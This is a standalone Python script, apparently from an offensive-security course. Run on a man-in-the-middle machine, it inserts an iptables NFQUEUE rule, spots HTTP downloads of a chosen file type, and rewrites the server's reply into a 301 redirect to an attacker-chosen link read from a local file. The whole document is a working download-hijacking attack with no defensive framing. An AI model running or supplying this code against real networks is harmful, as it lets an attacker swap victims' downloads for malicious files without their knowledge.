#!/usr/bin/env python
import subprocess
from netfilterqueue import NetfilterQueue
import scapy.all as scapy

ack_list = []


def iptables(inp):
    if inp == 1:
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 1", shell=True)
    elif inp == 3:
        subprocess.call("iptables --flush", shell=True)


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def spoof():
    f = open("./replace_downloads.txt", "r")
    contents = f.read()
    file_type = contents.split(' ')[0]
    file_link = contents.split(' ')[1]
    return file_type, file_link


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        file_type, file_link = spoof()
        if scapy_packet[scapy.TCP].dport == 80:
            if file_type in scapy_packet[scapy.Raw].load:
                print("[+] Detected " + file_type + " File Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing File")
                print("[+] Replaced Link: " + file_link)
                http = "HTTP/1.1 301 Moved Permanently\nLocation: " + file_link + "\n\n"
                modified_packet = set_load(scapy_packet, http)
                packet.set_payload(str(modified_packet))
    packet.accept()


print("[+] Modifying IP Tables....")
iptables(1)
queue = NetfilterQueue()
print("[+] Waiting for Target...")
try:
    queue.bind(1, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("")
    print("[+] Detected CTRL + C .... Quitting.")
    print("[+] Restoring IP Tables.....")
    iptables(3)
    print("[+] Restoring Complete")
